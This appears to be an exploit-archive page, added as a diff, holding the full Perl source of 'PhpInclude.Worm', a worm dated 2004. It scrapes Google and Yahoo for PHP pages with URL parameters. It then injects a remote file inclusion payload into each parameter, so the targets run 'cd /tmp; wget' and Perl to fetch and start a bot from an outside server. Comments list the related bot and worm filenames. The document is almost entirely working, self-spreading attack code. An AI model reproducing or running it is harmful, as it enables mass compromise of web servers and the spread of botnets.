@@ -1,0 +1,229 @@
+<html>
+<head>
+<title>PhpInclude.Worm - PHP Scripts Automated Arbitrary File Inclusion</title>
+<pre>
+#!/usr/bin/perl
+
+use LWP::Simple;
+use IO::Socket::INET;
+
+while(1){
+$numr = int rand(9999);
+$caxe = &quot;.&quot;;
+$caxe1 = &quot;.&quot;;
+$caxe .= rand(9999);
+$caxe1 .= rand(9999);
+$arq = &quot;.&quot;;
+$arq = int rand(9999);
+
+open(sites,&quot;&gt;$arq&quot;);
+print sites &quot;&quot;;
+close(sites);
+
+
+$procura = 'inurl:*.php?*=' . $numr;
+
+for($n=0;$n&lt;900;$n += 10){
+$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; &quot;www.google.com.br&quot;, PeerPort 
+=&gt; 80, Proto =&gt; &quot;tcp&quot;) or next;
+print $sock &quot;GET /search?q=$procura&amp;start=$n HTTP/1.0\n\n&quot;;
+@resu = &lt;$sock&gt;;
+close($sock);
+$ae = &quot;@resu&quot;;
+while ($ae=~ m/&lt;a href=.*?&gt;.*?&lt;\/a&gt;/){
+$ae=~ s/&lt;a href=(.*?)&gt;.*?&lt;\/a&gt;/$1/;
+$uber=$1;
+if ($uber !~/translate/)
+{
+if ($uber !~ /cache/)
+{
+if ($uber !~ /&quot;/)
+{
+if ($uber !~ /google/)
+{
+if ($uber !~ /216/)
+{
+if ($uber =~/http/)
+{
+if ($uber !~ /start=/)
+{
+open(arq,&quot;&gt;&gt;$arq&quot;);
+print arq &quot;$uber\n&quot;;
+close(arq);
+}}}}}}}}}
+
+
+for($cadenu=1;$cadenu &lt;= 991; $cadenu +=10){
+
+@cade = get(&quot;http://cade.search.yahoo.com/search?p=$procura&amp;ei=UTF-8&amp;fl=0&amp;all=1
+&amp;pstart=1&amp;b=$cadenu&quot;) or next;
+$ae = &quot;@cade&quot;;
+
+while ($ae=~ m/&lt;em class=yschurl&gt;.*?&lt;\/em&gt;/){
+$ae=~ s/&lt;em class=yschurl&gt;(.*?)&lt;\/em&gt;/$1/;
+$uber=$1;
+
+$uber =~ s/ //g;
+$uber =~ s/&lt;b&gt;//g;
+$uber =~ s/&lt;\/b&gt;//g;
+
+open(a,&quot;&gt;&gt;$arq&quot;);
+print a &quot;$uber\n&quot;;
+close(a);
+}}
+
+$ark = $arq; 
+@si = &quot;&quot;;
+open (arquivo,&quot;&lt;$ark&quot;);
+@si = &lt;arquivo&gt;;
+close(arquivo);
+$novo =&quot;&quot;; 
+foreach (@si){
+if (!$si{$_})
+{ 
+$novo .= $_;
+$si{$_} = 1;
+}
+}
+open (arquivo,&quot;&gt;$ark&quot;);
+print arquivo $novo;
+close(arquivo);
+
+
+$a =0;
+$b =0;
+open(ae,&quot;&lt;$arq&quot;);
+while(&lt;ae&gt;)
+{$sites[$a] = $_;
+chomp $sites[$a];
+$a++;
+$b++;}
+close(ae);
+
+for ($a=0;$a&lt;=$b;$a++){
+open (file, &quot;&gt;$caxe&quot;);
+print file &quot;&quot;;
+close(file);
+open (file, &quot;&gt;$caxe1&quot;);
+print file &quot;&quot;;
+close(file);
+$k=0;
+$e=0;
+$data=get($sites[$a]) or next;
+while($data=~ m/&lt;a href=&quot;.*?&quot;&gt;.*?&lt;\/a&gt;/){
+$data=~ s/&lt;a href=&quot;(.*?)&quot;&gt;.*?&lt;\/a&gt;/$1/;
+$ubersite=$1;
+
+if ($ubersite =~/&quot;/)
+{
+$nu = index $ubersite, '&quot;';
+$ubersite = substr($ubersite,0,$nu);
+}
+if ($ubersite !~/http/)
+{$ubersite = $sites[$a].'/'.$ubersite;} 
+open(file,&quot;&gt;&gt;$caxe&quot;) || die(&quot;nao abriu caxe.txt $!&quot;);
+print file &quot;$ubersite\n&quot;; 
+close(file); 
+}
+
+$lista1 = 'http://server/spy.gif?&amp;cmd=cd /tmp;wget www.server.tld/spybot.txt; perl php.txt';
+# Other filenames included with this and other variants :
+# adfkgnnodfijg 
+# bot 
+# bot.txt 
+# bot.txt.1 
+# dry.scp 
+# ssh.a 
+# terrorbot.txt 
+# terrorbot.txt.1 
+# terrorworm.txt 
+# terrorworm.txt.1 
+# unbot.txt 
+# unbot.txt.1 
+# unbot.txt.2 
+# unbot.txt.3 
+# unworm.txt 
+# unworm.txt.1 
+# unworm.txt.2 
+# unworm.txt.3 
+# worm1.txt 
+# worm.txt 
+# worm.txt.1 
+$t =0;
+$y =0;
+@ja;
+open(opa,&quot;&lt;$caxe&quot;) or die &quot;nao deu pra abrir o arquivo caxe.txt&quot;;
+while (&lt;opa&gt;)
+{
+$ja[$t] = $_;
+chomp $ja[$t];
+$t++;
+$y++;
+}
+close(opa);
+$t=1;
+while ($t &lt; $y)
+{
+if ($ja[$t] =~/=/)
+{
+$num = rindex $ja[$t], '=';
+$num += 1;
+$ja[$t] = substr($ja[$t],0,$num); 
+open (jaera,&quot;&gt;&gt;$caxe1&quot;) or die &quot;nao deu pra abrir ou criar caxe1.txt&quot;;
+print jaera &quot;$ja[$t]$lista1\n&quot;;
+close(jaera);
+$num = index $ja[$t], '=';
+$num += 1;
+$ja[$t] = substr($ja[$t],0,$num); 
+$num1 = rindex $ja[$t], '.';
+$subproc = substr($ja[$t],$num1,$num);
+
+open (jaera,&quot;&gt;&gt;$caxe1&quot;) or die &quot;nao deu pra abrir ou criar caxe1.txt&quot;;
+print jaera &quot;$ja[$t]$lista1\n&quot;;
+close(jaera);
+}
+$t++;
+}
+$ark = &quot;$caxe1&quot;; 
+@si = &quot;&quot;;
+open (arquivo,&quot;&lt;$ark&quot;);
+@si = &lt;arquivo&gt;;
+close(arquivo);
+$novo =&quot;&quot;; 
+foreach (@si){
+if (!$si{$_})
+{ 
+$novo .= $_;
+$si{$_} = 1;
+}
+}
+open (arquivo,&quot;&gt;$ark&quot;);
+print arquivo $novo;
+close(arquivo);
+$q=0;
+$w=0;
+@hot;
+open (ops,&quot;&lt;$caxe1&quot;);
+while(&lt;ops&gt;)
+{
+$hot[$q] = $_;
+chomp $hot[$q];
+$q++;
+$w++;
+}
+close(ops);
+
+for($q=0;$q&lt;=$w;$q++)
+{
+
+if ($hot[$q] =~/http/)
+{
+$tipo=get($hot[$q]) or next;
+}}
+}
+}
+
+# milw0rm.com [2004-12-25]
+</pre>
+</html>
+
